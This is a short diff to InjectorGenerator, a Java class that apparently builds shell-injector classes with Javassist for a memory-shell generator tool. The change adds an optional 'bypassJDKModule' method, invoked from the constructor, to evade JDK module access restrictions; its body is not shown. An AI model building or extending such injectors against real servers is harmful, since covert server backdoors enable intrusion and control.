@@ -1,15 +1,10 @@
 package jmg.core.generator;
 
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtMethod;
+import javassist.*;
+import javassist.bytecode.AccessFlag;
 import jmg.core.config.AbstractConfig;
 import jmg.core.config.Constants;
-import jmg.core.util.CommonUtil;
-import jmg.core.util.CtClassUtil;
-import jmg.core.util.InjectorUtil;
-import jmg.core.util.JavassistUtil;
+import jmg.core.util.*;
 
 
 /**
@@ -60,6 +55,19 @@ public class InjectorGenerator {
             if (shellClassName != null) {
                 CtMethod getUrlPattern = ctClass.getDeclaredMethod("getClassName");
                 getUrlPattern.setBody(String.format("{return \"%s\";}", shellClassName));
+            }
+
+            if (config.isEnableBypassJDKModule()) {
+                // 添加 bypassJDKModule 方法
+                CtMethod ctMethod = new CtMethod(CtClass.voidType, "bypassJDKModule", new CtClass[0], ctClass);
+                ctMethod.setModifiers(AccessFlag.PUBLIC);
+                ctMethod.setBody(JDKBypassUtil.bypassJDKModuleBody());
+                ctClass.addMethod(ctMethod);
+
+                // 添加 bypassJDKModule 调用
+                CtConstructor constructor = ctClass.getConstructors()[0];
+                constructor.setModifiers(javassist.Modifier.setPublic(constructor.getModifiers()));
+                constructor.insertBeforeBody("bypassJDKModule();");
             }
 
             JavassistUtil.setNameIfNotNull(ctClass, config.getInjectorClassName());
